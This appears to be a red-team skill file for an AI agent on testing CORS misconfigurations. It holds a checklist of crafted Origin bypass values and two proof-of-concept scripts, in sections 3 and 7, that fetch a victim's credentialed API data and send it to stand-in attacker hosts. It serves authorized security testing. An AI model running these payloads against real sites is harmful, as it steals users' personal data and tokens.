---
name: cors-testing
description: CORS misconfiguration testing for data theft and access control bypass
origin: RedteamOpencode
---

# CORS Misconfiguration Testing

## When to Activate

- API returns `Access-Control-Allow-Origin` header
- Cross-origin requests observed in application flow
- Sensitive data served via API endpoints
- Single-page application with API backend

## Tools

- `run_tool curl` (send crafted Origin headers)
- Burp Suite Repeater
- Browser DevTools (Console for fetch tests)
- CORScanner (automated testing)
- Custom HTML PoC pages

## Methodology

### 1. Baseline Check

- [ ] Send request without Origin — note default CORS headers
- [ ] Send with legitimate Origin — note response headers
- [ ] Check for: `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`
- [ ] Check `Access-Control-Allow-Methods` and `Access-Control-Allow-Headers`
- [ ] Test on sensitive endpoints that return user data

### 2. Origin Reflection Test

- [ ] `Origin: https://evil.com` → does response reflect it in ACAO?
- [ ] `Origin: https://evil.com` + `Access-Control-Allow-Credentials: true` = Critical
- [ ] If ACAO reflects any origin → full data theft possible

### 3. Null Origin

- [ ] `Origin: null` → check if `Access-Control-Allow-Origin: null`
- [ ] Null origin triggered by: sandboxed iframes, `data:` URIs, local files
- [ ] PoC: `<iframe sandbox="allow-scripts" src="data:text/html,<script>fetch('https://target/api/me',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('https://attacker/log?'+JSON.stringify(d)))</script>">`

### 4. Subdomain / Domain Variations

- [ ] `Origin: https://sub.target.com` — subdomain trust
- [ ] `Origin: https://target.com.evil.com` — suffix match flaw
- [ ] `Origin: https://eviltarget.com` — prefix match flaw
- [ ] `Origin: https://target.com.evil.com` — regex bypass
- [ ] `Origin: https://target.com%60.evil.com` — encoded characters
- [ ] If subdomain accepted + XSS on subdomain = full chain

### 5. Wildcard Misconfiguration

- [ ] `Access-Control-Allow-Origin: *` — public access (lower severity)
- [ ] `*` with `Access-Control-Allow-Credentials: true` — browsers block this, but check
- [ ] Wildcard on sensitive endpoints = information disclosure

### 6. Preflight Bypass

- [ ] Simple requests (GET, POST with standard content-types) skip preflight
- [ ] Test if server enforces CORS only on OPTIONS but not on actual request
- [ ] Change Content-Type to `text/plain` to avoid preflight

### 6b. Parser Differential & Regex Origin-Validation Flaws

- [ ] Case sensitivity: `Origin: https://TARGET.com` vs allowlist logic expecting lowercase
- [ ] Missing anchors in allowlist regex: `target.com` unanchored matches `nottarget.com` or `target.com.attacker.net` — probe both prefix and suffix injection
- [ ] Port/scheme confusion: `Origin: http://target.com:443` or `Origin: https://target.com:80` — some validators strip/ignore port or scheme when comparing
- [ ] Multiple Origin headers or Origin header duplicated with different casing to confuse header-parsing middleware differences (proxy vs app-server)
- [ ] Trailing dot: `Origin: https://target.com.` — DNS-equivalent but string-distinct from allowlist entry
- [ ] Underscore/hyphen homograph subdomains if the app auto-provisions subdomains (`target-com.attacker.com`, `targetacom.com`)
- [ ] Unicode/punycode confusable domains if IDN subdomains are in scope: `xn--` normalized forms that string-match differently pre/post normalization

### 7. Build Exploitation PoC

- [ ] Data theft PoC:
      ```html
      <script>
      fetch('https://target.com/api/sensitive-data', {
        credentials: 'include'
      })
      .then(r => r.json())
      .then(data => {
        fetch('https://attacker.com/steal?d=' + btoa(JSON.stringify(data)));
      });
      </script>
      ```
- [ ] Host on attacker domain, have victim visit
- [ ] Demonstrate exfiltrated data

### 8. Impact Assessment

- [ ] What data can be stolen? (PII, tokens, financial data)
- [ ] Can state-changing actions be performed? (CSRF via CORS)
- [ ] Is authentication data (cookies, tokens) included in cross-origin requests?
- [ ] Chain with subdomain takeover or XSS for higher impact

## What to Record

- Endpoint with CORS misconfiguration
- Exact ACAO and ACAC header values returned
- Origin value that triggered the misconfiguration
- Working PoC HTML demonstrating data theft
- Data accessible through the misconfiguration
- Severity: High (credentials + reflection) to Medium (wildcard, no credentials)
- Remediation: strict Origin allowlist, avoid reflecting Origin, avoid credentials with wildcard
